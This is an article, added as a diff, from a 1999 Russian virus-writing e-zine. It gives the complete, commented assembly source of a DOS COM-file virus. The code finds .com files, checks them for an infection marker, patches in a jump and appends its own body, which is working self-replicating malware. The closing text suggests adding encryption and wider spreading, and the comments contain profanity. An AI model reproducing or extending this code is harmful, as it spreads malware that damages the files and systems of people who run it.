@@ -1,0 +1,178 @@
+┌──┬──┐          /╔════╗/╦══╗ /╔═══╗  ╔═══╗ /╔══╦══╗/╦   /╦/╦══╗ /╔═══╗ ╔═══╗
+   │┬  ┌──       │║   /╩│║ /╚╗│║  /  │║  │║ // │║ //│║   │║│║ /╚╗│║  /╩│║ │/╩
+   │├─┐│ ░░▒▒▒▓▓▓│║▓▓▓▓▓│║▓/╔╝│║▓▓▓▓▓╔╩═══╩╗▓▓▓│║▓▓▓│║▓▓▓│║│║▓/╔╝│║▓▓▓▓│║▓▒▒░
+   ││ │├─        │║     │╠══╣ │║═   │║    │║   │║   │║   │║│╠══╣ │║═   /╚═══╗
+   ││ ││         │║   /╦│║  ╚╗│║  /╦│║    │║   │║   │║   ╔╝│║  ╚╗│║  /╦ ╦  │║
+   │┴ ┘└─┘       /╚════╝/╩  /╩/╚═══╝/╩    /╩   /╩   /╚═══╝ /╩  /╩/╚═══╝/╚═══╝
+   │ THE CREATURES │ Computer Virus Magazine │ April 1999            issue 03
+   │───────────────┴─────────────────────────┴───────────────────────────────
+   │
+   │                   ПРИМЕР COM.ВИРУСА  (С КОММЕНТАРИЯМИ :)
+
+══════════════════════════════════════════════════════════════════════════════
+
+    Тут мне один товарищ написал: "на ламеров рассчитывать не нужно, на
+ бегиннеров наверно тоже". Посмотрим. Кстати, и вы напишите свое мнение на
+ ThePretender@mail.ru
+                                                          Терпеливый Jarod
+
+ (отрежте еще кусок бреда снизу вируса)
+-----------------------------8<-----------------------------------------------
+
+
+;
+;  "Такие вирусы клуб писал за год до образования клуба..."
+;                                                            LovinGOD, IV#7
+
+VIRUS   segment
+        assume cs:VIRUS, ds:VIRUS
+        org 100h
+
+START:  jmp VIR
+
+        int 21h                  ; ДрозДофил   <-- это не опечатка
+;                                     ^^^
+VIR:
+        call LAUNCH              ; Первоначально при старте вирус должен
+LAUNCH:                          ; определить свое местоположение
+        pop bp                   ; относительно CS:100h
+        sub bp, offset LAUNCH    ; Смещение я помещаю в BP
+
+        mov al, byte ptr (bp+offset BYTES)
+        mov byte ptr cs:[100h], al
+        mov al, byte ptr (bp+1+offset BYTES)
+        mov byte ptr cs:[101h], al
+        mov al, byte ptr (bp+2+offset BYTES)
+        mov byte ptr cs:[102h], al
+                                        ; Восстановили три байта
+        mov ah, 1Ah
+        lea dx, [DTA+bp]
+        int 21h                         ; Установим свою DTA, тк
+                                        ; носитель, может, тоже захочет
+        mov ah, 4Eh                     ; ею пользоваться
+        lea dx, [COMS+bp]               ; (параметры и т.п.)
+        mov cx, 20h
+        int 21h                         ; Ищем файл
+                                        ; (функция 4E - FindFirst)
+REPEAT: jnc OK
+        jmp QUIT
+OK:
+
+        mov ax, 3D02h
+        lea dx, [DTA+1Eh+bp]
+        int 21h                         ; Откроем файл для random access
+        jnc  OK2
+        jmp NEXT
+OK2:
+        mov word ptr (offset VICTIM+bp), ax
+        mov bx, ax
+        mov ax, 4202h                   ; ф-ция 42h - сместить указатель
+        mov cx, 0FFFFh
+        mov dx, (-2)
+        int 21h                         ; Штирлиц стоял на своем...
+
+        add ax, 02
+        cmp ax, LEN                     ; Маленьких мы не трогаем
+        jnb  OK3
+        jmp NEXT                        ; (это называется "узнаем размер файла,
+OK3:                                    ; встав на его конец". Легонько.)
+        sub ax, 0003h                   ; вычтем 3 из AX
+
+        mov word ptr [WRITE+1][bp], ax
+
+        mov bx, word ptr VICTIM[bp]     ; VICTIM+bp и VICTIM[bp] - это
+        mov ah, 3Fh                     ;                        одно и то же
+        mov cx, 02h
+        lea dx, BUF[bp]
+        int 21h                         ; Прочитаем словечко. ("He is alive!"
+                                        ; (DE AD)               "Frankenstain")
+        jc  NEXT
+
+        mov ax, word ptr BUF[bp]        ; Проверка на зараженность
+        cmp ax, word ptr ID[bp]
+        je NEXT                         ; Ужо наш >:]]  ... Надеюсь {:-)
+
+INFECT: mov ax, 4200h
+        mov bx, word ptr VICTIM[bp]
+        xor cx, cx
+        mov dx, cx
+        int 21h
+
+        mov ah, 3Fh
+        mov cx, 03
+        lea dx, BYTES[bp]
+        int 21h                         ; Прочитаем первые три байта жертвы
+
+        mov ax, 4200h
+        xor cx, cx
+        mov dx, cx
+        int 21h                         ; Ща будем JMP приписывать...
+
+        mov al, 0E9h                    ; JMP
+        mov byte ptr WRITE[bp], al
+
+        mov ah, 40h
+        mov cx, 03
+        lea dx, WRITE[bp]
+        int 21h                         ; Теперь всю эту хрень в файл
+
+        mov ax, 4202h
+        xor cx, cx
+        sub dx, dx
+        mov bx, word ptr VICTIM[bp]
+        int 21h
+
+        mov ah, 40h
+        mov cx, LEN
+        mov bx, word ptr VICTIM[bp]
+        lea dx, VIR[bp]
+        int 21h                         ; И себя заобдно (это не опечатка)
+
+NEXT:   mov ah, 3Eh
+        int 21h
+
+        mov ah, 4Fh
+        int 21h
+        jmp REPEAT
+
+QUIT:   mov ah, 1Ah
+        mov dx, 80h
+        int 21h                         ; Установим оригинальную DTA
+        sub cx, cx                      ; Подготовка к старту...
+        sub bx, bx                      ; 5..
+        sub dx, dx                      ; 4..
+        push ax                         ; 3..
+        mov ax, 100h                    ; 2..
+        push ax                         ; 1..
+        xor ax, ax                      ; 0..
+        retn                            ; ПУСК!
+
+COMS:   db '*.com',0                    ;
+VICTIM: dw 0000h                        ; дескриптор, а по-русски хендл
+FLEN:   dw 0000h                        ; сие есмь ленгтх!
+BUF:    dw 0000h                        ; пиздатый буфер
+WRITE:  db 0,0,0
+BYTES:  mov ax, 4C00h                   ; Тут три байта
+ID:     dw 0ADDEh                       ; А тут поебень (DEAD)
+LEN     equ ($-VIR)
+DTA:    db 80h dup (?)
+
+VIRUS   ends
+        end START
+
+
+------------------------------------------------------------------------------
+    Ну вот и все. Можно было, конечно, слегка уменьшить размер вируса, убрав
+ те нолики в конце, тем более, там некоторые данные о жертве, но пусть уж
+ будут пока... Тем более что версия, так сказать, "обучающая", зато имеет
+ пиздатый эпигpаф.
+    А вообще там еще надо добавить:
+                       ■ Проверку файла на присутствие MZ
+                         (а то заразит command.com и все...)
+                       ■ Проверку на максимальную длину файла
+                       ■ Шифрование вируса
+                       
+                       ■ Еще надо расширить радиус действия
+                         (скажем, смена каталогов)
+
+    Ну вот теперь уж все.
